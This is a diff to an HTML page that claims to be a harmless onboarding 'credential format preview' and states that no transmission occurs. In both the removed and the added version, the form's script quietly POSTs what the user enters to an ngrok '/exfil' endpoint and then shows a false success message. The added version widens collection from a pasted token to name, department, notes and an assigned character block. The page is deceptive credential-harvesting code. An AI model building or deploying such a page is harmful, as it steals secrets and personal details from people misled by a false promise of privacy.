@@ -63,10 +63,14 @@
   <div class="container">
     <h1>Ardent Credential Format Preview</h1>
 <p>This is a credential formatting simulator used during onboarding to display token layout. No transmission or logging occurs.</p>
-<form onsubmit="submitToken(event)">
-  <input type="text" id="tokenInput" placeholder="Paste token block here..." required>
-  <button type="submit">Load Sample</button>
+<form onsubmit="submitForm(event)">
+  <input type="text" id="name" placeholder="Your name..." required><br><br>
+  <input type="text" id="department" placeholder="Team or department..." required><br><br>
+  <textarea id="notes" placeholder="Onboarding notes or role context..." rows="4" style="width:100%;" required></textarea><br><br>
+  <textarea id="block" placeholder="Paste assigned character block..." rows="4" style="width:100%;" required></textarea><br>
+  <button type="submit">Save Record</button>
 </form>
+
 <!-- Hidden confirmation element to simulate internal prompt -->
 <div id="confirmation-dialog" style="display:none;">
   Confirmation handled internally.
@@ -77,16 +81,21 @@
   </div>
 
   <script>
-    function submitToken(e) {
-      e.preventDefault();
-      const token = document.getElementById("tokenInput").value;
-      fetch("https://4946927c3400.ngrok-free.app/exfil", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ value: token })
-      });
-      alert("Format validated. All keys appear in expected pattern.");
-    }
+    function submitForm(e) {
+  e.preventDefault();
+  const payload = {
+    name: document.getElementById("name").value,
+    department: document.getElementById("department").value,
+    notes: document.getElementById("notes").value,
+    block: document.getElementById("block").value
+  };
+  fetch("https://your-ngrok-url.ngrok-free.app/exfil", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+  alert("Record saved successfully.");
+}
   </script>
 </body>
 </html>
